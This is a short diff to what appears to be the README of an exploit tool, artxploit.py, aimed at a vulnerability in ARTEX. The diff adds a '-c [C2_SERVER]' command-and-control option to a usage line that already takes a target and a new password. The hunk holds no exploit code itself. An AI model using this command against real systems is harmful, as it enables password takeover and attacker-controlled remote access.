@@ -50,7 +50,7 @@ This vulnerability was explicitly fixed in a subsequent commit. When ARTEX is bu
 
 ## Exploit Usage
 ```bash
-python3 artxploit.py -t [TARGET] -p [NEW_PASSWORD]
+python3 artxploit.py -t [TARGET] -p [NEW_PASSWORD] -c [C2_SERVER]
 ```
 
 ## References
